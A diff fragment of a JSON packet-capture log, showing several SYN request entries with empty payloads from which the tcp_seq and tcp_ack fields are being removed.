     "timestamp": "2026-07-08T10:10:03.240",
@@ -6295,9 +5457,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 286652281,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.270",
@@ -6310,9 +5470,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 169883919,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.300",
@@ -6325,9 +5483,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 143380578,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.330",
@@ -6340,9 +5496,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 197348104,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.360",
@@ -6355,9 +5509,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 169784007,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.390",
@@ -6370,9 +5522,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 271903719,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:10:03.420",
@@ -6385,8 +5535,6 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 27842788,
-    "tcp_ack": 0
+    "payload_len": 0
   }
 ]
